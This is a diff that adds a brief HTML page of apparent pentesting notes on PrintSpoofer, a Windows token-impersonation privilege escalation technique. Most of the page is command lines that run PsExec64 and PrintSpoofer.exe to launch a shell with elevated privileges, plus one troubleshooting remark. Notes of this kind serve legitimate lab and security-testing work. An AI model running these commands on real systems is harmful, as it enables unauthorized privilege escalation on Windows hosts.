@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Print Spoofer</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Print Spoofer</h1><br/>PrintSpoofer is another Token impersonation exploit that specifically takes advantage of the windows spooler service CLSID. (only works on windows 10)<br /><br />C:\temp\PSExec64.exe -accepteula -i -u &quot;nt authority\local service&quot; C:\temp\Shell.exe		(To simulate getting the service account)<br />C:\temp\PrintSpoofer.exe –i -c &quot;C:\temp\Shell.exe&quot;<br />.\printspoofer.exe -i -c C:\temp\Shell32.exe<br />--NOTE-- I found that calling printspoofer with a full path does not seem to work...</div></body></html>
